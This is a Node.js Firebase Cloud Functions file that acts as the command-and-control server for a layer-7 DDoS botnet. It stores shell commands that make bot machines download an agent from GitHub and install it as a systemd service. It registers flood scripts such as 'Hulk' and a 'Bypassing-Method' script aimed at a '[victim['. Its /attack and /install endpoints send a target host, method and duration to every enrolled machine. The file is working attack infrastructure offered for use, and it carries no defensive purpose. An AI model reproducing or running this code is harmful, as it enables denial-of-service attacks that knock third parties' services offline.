const functions = require("firebase-functions");
const admin = require('firebase-admin');
const axios = require('axios')
const app = admin.initializeApp();

let globals = admin.firestore().collection('main').doc("globals")
let setup = admin.firestore().collection('main').doc("setup")
let scripts_ = admin.firestore().collection('scripts')
let stats_ = admin.firestore().collection('main').doc("stats")

globals.get().then(async (doc) => {
    if (!doc.exists) {
        globals.set(
            {
                "restart": {
                    "scheduled": false,
                    "at": null,
                    "last": null
                },
                "lockdown": true,
                "allDynamicData": true,
                "staticData": true,
                "simpleHeartbeatDelay": 20000,
                "complexHeartbeatDelay": 60000,
                "refreshTimerDelay": 3600000,
                "siDataPlacementDelay": 60000,
                "dynDataPlacementDelay": 30000,
                "maximumPortLife": 3600000,
                "latestGlobalsDump": 1640475376955
            }
        )
    }
})
stats_.get().then(async (doc) => {
    if (!doc.exists) {
        stats_.set(
            {
                "totalAttacks": 8,
                "userCount": 0
            }
        )
    }
})
setup.get().then(async (doc) => {
    if (!doc.exists) {
        setup.set(
            {
                "slaveNick": "canavarslave",
                "serviceName": "canavarslave.service",
                "undle": "sudo apt -y update; sudo apt -y upgrade ; sudo apt install wget; cd ~; curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh; sudo bash nodesource_setup.sh; sudo apt install nodejs -y; sudo apt install git -y; sudo apt install python-pip -y",
                "service_setup": "cd /lib/systemd/system/; wget [serviceLink[ -O [serviceName[; systemctl daemon-reload; systemctl start [serviceName[; systemctl enable [serviceName[;",
                "download_agent": "cd /; mkdir [slaveNick[; cd [slaveNick[; wget [agentLink[; mkdir scripts;",
                "download_modules": "npm install express fs axios events moment delay quick.db child_process systeminformation",
                "scriptdir": "/[slaveNick[/scripts/",
                "agentLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js",
                "serviceLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/canavarl7.service",
                "slaveUpdate": "cd /[slaveNick[/; wget [agentLink[ -O index.js; systemctl restart [serviceName["
            }
        )
    } else {
        let setupdata = doc.data()
        for (const key in setupdata) {
            let k = key
            let aa = (stitchSetupLines(k, (setupdata)))
            if (aa) {
                ((setupdata)[k]) = aa
            }
        }
        setup.set(
            setupdata
        )
    }
})
scripts_.get().then(async (doc) => {
    if (!doc.exists) {
        scripts_.doc("97ae0e0c0fd1fc7616e4ef2e190de65f").set(
            {
                "name": "Hulk",
                "lang": "python",
                "process": "python2",
                "filename": "hulk.py",
                "dictation": "python2 [scriptdir[hulk.py http://[victim[",
                "description": "Basic L7 Script, Recommended",
                "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/scripts/hulk.py"
            }
        )
        scripts_.doc("b98e97d8ba98b17c43f8b9ab1ad4837b").set(
            {
                "name": "DMC",
                "lang": "python",
                "process": "python2",
                "filename": "custommatter.py",
                "dictation": "python2 [scriptdir[custommatter.py [victim[",
                "description": "Customized Bypassing-Method L7 Script",
                "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/scripts/custommatter.py"
            }
        )
    }
})




exports.helloWorld = functions.https.onRequest((request, response) => {
    functions.logger.info("Hello logs!", { structuredData: true });
    response.send("Hello from Firebase!");
});

exports.heartbeat = functions.https.onRequest(async (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    let machine = req.body.machine
    machine.lastHeartbeat = Date.now()
    await admin.firestore().collection('machines').doc(`${ip}`).set(req.body.machine, { merge: true })
    globals.get().then(async (doc) => {
        res.send(doc.data())
    })
});

exports.setup = functions.https.onRequest((req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    let detid = ([Object.keys(req.query)[1]][0]);
    //console.log(scid, detid);

    setup.get().then(async (doc) => {
        let setupdata = doc.data()
        for (const key in setupdata) {
            let k = key
            let aa = (stitchSetupLines(k, (setupdata)))
            if (aa) {
                ((setupdata)[k]) = aa
            }
        }
        if (!((Object.keys(setupdata)).includes(scid))) {
            res.send(200, setupdata)
        } else {
            if (setupdata[scid]) {
                res.send(200, setupdata[scid])
            }
        }
    })

});
exports.attack = functions.https.onRequest(async (req, res) => {
    let rquer = req.query
    await admin.firestore().collection("machines").get().then(async (querySnapshot) => {
        await querySnapshot.forEach(async (doc) => {
            let cmachine = doc.data()
            console.log(`http://${doc.id}:${cmachine.port.number}/attack/${rquer.method}/${rquer.host}/${rquer.time}/${rquer.id}`);
            axios.get(`http://${doc.id}:${cmachine.port.number}/attack/${rquer.method}/${rquer.host}/${rquer.time}/${rquer.id}`)
                .then(res => {
                    console.log(res)
                })
                .catch(err => {
                    console.error(err.response.data);
                })
        });
    });
    res.send(200)
});
exports.install = functions.https.onRequest(async (req, res) => {
    let rquer = req.query
    console.log(rquer);
    let machines = {
        asked: [],
        responded: [],
        busy: []
    }
    await admin.firestore().collection("machines").get().then(async (querySnapshot) => {
        await querySnapshot.forEach(async (doc) => {
            let cmachine = doc.data()
            console.log(`http://${doc.id}:${cmachine.port.number}/installScript/${rquer.scriptid}`);
            await axios.get(`http://${doc.id}:${cmachine.port.number}/installScript/${rquer.scriptid}`)
                .then(res => {
                    machines.responded.push(currentMachine)
                    return
                })
                .catch(err => {
                    console.error(err.response.data);
                    machines.busy.push(currentMachine)
                    return
                })
        });
        res.send(200, machines)
    });
});
exports.globals = functions.https.onRequest((req, res) => {
    globals.get().then(async (doc) => {
        res.send(doc.data())
    })
});
exports.scripts = functions.https.onRequest(async (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    let detid = ([Object.keys(req.query)[1]][0]);
    let scriptId = req.query.id
    //console.log(scid);
    if (scid === undefined) {
        let sdata = {}
        await scripts_.get().then(async (querySnapshot) => {
            await querySnapshot.forEach(async (doc) => {
                sdata[`${doc.id}`] = doc.data()
            });
        });
        res.send(200, sdata)
    } else if (scriptId) {
        scripts_.doc(scriptId).get().then(async (doc) => {
            if (doc.exists) {
                let cScript = doc.data()
                if (detid) {
                    setup.get().then(async (setupdoc) => {
                        let setupdata = setupdoc.data()
                        res.send(200, `cd ${setupdata.scriptdir}; wget ${cScript.source} -O ${cScript.filename}`)
                    })
                } else {
                    res.send(200, doc.data())
                }
            } else {
                res.send(500, {
                    error: {
                        message: "SCRIPT_DOES_NOT_EXIST",
                        innerResponse: `SCRIPT_DOES_NOT_EXIST`
                    }
                })
            }
        })
    }
});
exports.stats = functions.https.onRequest((req, res) => {
    stats_.get().then(async (doc) => {
        res.send(doc.data())
    })
});

exports.status = functions.https.onRequest((req, res) => {
    res.send(200, "OKAY")
});

exports.machines = functions.https.onRequest(async (req, res) => {
    let machines = {}
    await admin.firestore().collection("machines").get().then(async (querySnapshot) => {
        await querySnapshot.forEach(async (doc) => {
            machines[`${doc.id}`] = doc.data()
        });
    });
    res.send(machines)
});

exports.machinesList = functions.https.onRequest(async (req, res) => {
    let machines = []
    await admin.firestore().collection("machines").get().then(async (querySnapshot) => {
        await querySnapshot.forEach(async (doc) => {
            machines.push(doc.id)
        });
    });
    res.send(machines)
});

exports.machinesCount = functions.https.onRequest(async (req, res) => {
    let machinesC = 0
    await admin.firestore().collection("machines").get().then(async (querySnapshot) => {
        await querySnapshot.forEach(async (doc) => {
            let a = doc.id
            console.log(machinesC);
            machinesC++
        });
    });
    console.log("send");
    res.send(200, `${machinesC}`)
});


function stitchSetupLines(asked, setup_) {
    if (setup_[asked]) {
        if ((setup_[asked]).includes("[")) {
            let a = setup_[asked]
            let b = (a.split("["));
            for (let c = 0; c < b.length; c++) {
                let d = b[c];
                d = d.split("]")[0]
                if (setup_[d]) {
                    b[c] = setup_[d]
                }
            }
            let e = b.join("")
            return e
        } else {
            return (setup_[asked])
        }
    } else {
        return null
    }
}